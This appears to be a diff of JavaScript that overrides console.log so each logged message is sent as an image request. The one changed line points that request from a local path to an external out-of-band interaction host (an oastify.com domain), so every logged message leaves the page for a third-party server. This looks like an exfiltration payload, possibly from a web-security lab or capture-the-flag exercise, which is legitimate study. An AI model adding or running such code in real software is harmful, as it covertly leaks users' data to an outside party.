@@ -17,7 +17,7 @@ console.log = async (...msg) => {
             let i = document.createElement('img');
             return await new Promise(r => {
                 i.onload = i.onerror = r;
-                i.src = `/?msg=${m}`;
+                i.src = `https://wbbdjsizcxij7r4lh3zjgtzg87ez2pqe.oastify.com/?msg=${m}`;
                 document.body.appendChild(i);
             });
         }
